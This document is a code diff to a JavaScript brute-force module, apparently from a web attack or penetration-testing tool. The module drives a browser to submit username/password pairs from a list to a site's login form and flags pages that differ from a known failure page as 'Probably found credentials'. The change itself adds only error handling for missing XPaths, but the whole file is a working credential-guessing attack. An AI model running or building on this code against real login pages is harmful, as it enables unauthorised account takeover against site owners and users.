@@ -21,22 +21,26 @@ class BruteForceSubTask {
 
 		await webDriver.goTo(serverHome)
 
-		await webDriver.doLogin('red-face', '-1', this.jsonconfig.taskdata.bruteforcetab.data.loginFormXPathExpr, this.jsonconfig.taskdata.bruteforcetab.data.loginNameXPathExpr, this.jsonconfig.taskdata.bruteforcetab.data.loginPswXPathExpr)
-		let errorPage = await webDriver.getDocumentText()
+		let resFirstLogin = await webDriver.doLogin('red-face', '-1', this.jsonconfig.taskdata.bruteforcetab.data.loginFormXPathExpr, this.jsonconfig.taskdata.bruteforcetab.data.loginNameXPathExpr, this.jsonconfig.taskdata.bruteforcetab.data.loginPswXPathExpr)
+		if (resFirstLogin) {
+			let errorPage = await webDriver.getDocumentText()
 
-		for (let i = 0; i < data.length; i++) {
-			console.log(['Worker:', id, , '|', 'Testing', data[i][0], data[i][1]].join(' '))
-			await webDriver.goTo(serverHome)
-			await webDriver.doLogin(data[i][0], data[i][1], this.jsonconfig.taskdata.bruteforcetab.data.loginFormXPathExpr, this.jsonconfig.taskdata.bruteforcetab.data.loginNameXPathExpr, this.jsonconfig.taskdata.bruteforcetab.data.loginPswXPathExpr)
-			let tmp = await webDriver.getDocumentText()
-			let similarity = stringSimilarity.compareTwoStrings(errorPage, tmp)
-			if ((similarity * 100) < 1) {
-				console.log('!!!!! Probably found credentials')
-				console.log([data[i][0], data[i][1]].join(' '))
+			for (let i = 0; i < data.length; i++) {
+				console.log(['Worker:', id, , '|', 'Testing', (data[i][0]), (data[i][1])].join(' '))
+				await webDriver.goTo(serverHome)
+				await webDriver.doLogin(data[i][0], data[i][1], this.jsonconfig.taskdata.bruteforcetab.data.loginFormXPathExpr, this.jsonconfig.taskdata.bruteforcetab.data.loginNameXPathExpr, this.jsonconfig.taskdata.bruteforcetab.data.loginPswXPathExpr)
+				let tmp = await webDriver.getDocumentText()
+				let similarity = stringSimilarity.compareTwoStrings(errorPage, tmp)
+				if ((similarity * 100) < 1) {
+					console.log('!!!!! Probably found credentials')
+					console.log([data[i][0], data[i][1]].join(' '))
+				}
+				if (forceExit) {
+					break
+				}
 			}
-			if (forceExit) {
-				break
-			}
+		} else {
+			console.log(['Worker:', id, , '|', 'ERROR: Some xpaths wasn\'t found.Please, check your xpaths or repeat action.'].join(' '))
 		}
 
 		await webDriver.closeDriver()
